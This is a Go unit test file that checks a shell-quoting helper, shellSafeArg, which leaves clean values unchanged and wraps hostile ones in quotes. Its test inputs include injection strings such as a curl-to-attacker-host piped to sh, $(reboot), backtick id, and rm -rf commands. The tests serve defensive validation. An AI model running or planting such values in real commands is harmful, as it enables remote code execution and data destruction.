package main

import (
	"strings"
	"testing"
)

func TestShellSafeArgLeavesCleanValuesAndPlaceholdersBare(t *testing.T) {
	bare := []string{
		"resnet-18", "bert_base", "demo-model", "pipe-042",
		"http://172.16.50.30:5000", "team/demo.ipynb", "acme", "churn",
		"model/data", "v1.2.3", "user@host", "a=b", "50%",
		"<model>", "<a-discovered-model>", "<namespace>", "<pipeline-id>", "<file-ref>",
	}
	for _, v := range bare {
		if got := shellSafeArg(v); got != v {
			t.Errorf("shellSafeArg(%q) = %q, want unchanged (safe value / placeholder)", v, got)
		}
	}
}

func TestShellSafeArgQuotesHostileValues(t *testing.T) {
	cases := []struct {
		in   string
		want string
	}{
		{"pipe-1; curl attacker/sh|sh", `'pipe-1; curl attacker/sh|sh'`},
		{"x$(reboot)", `'x$(reboot)'`},
		{"a b", `'a b'`},
		{"a`id`", "'a`id`'"},
		{"m&& rm -rf ~", `'m&& rm -rf ~'`},
		{"a\nb", "'a\nb'"},
		{"weird<name>", `'weird<name>'`}, // has metachar-adjacent text, not a clean placeholder
	}
	for _, c := range cases {
		if got := shellSafeArg(c.in); got != c.want {
			t.Errorf("shellSafeArg(%q) = %q, want %q", c.in, got, c.want)
		}
	}
}

// The single-quote escaping must itself be injection-proof: a value containing a
// single quote can't break out of the surrounding quotes.
func TestShellSafeArgEscapesEmbeddedSingleQuote(t *testing.T) {
	got := shellSafeArg("it's; rm -rf /")
	want := `'it'\''s; rm -rf /'`
	if got != want {
		t.Fatalf("shellSafeArg embedded-quote = %q, want %q", got, want)
	}
	// The result must contain no un-escaped closing quote that would expose the tail.
	if strings.Contains(got, "s; rm") && !strings.Contains(got, `'\''s; rm`) {
		t.Fatalf("embedded quote not neutralized: %q", got)
	}
}
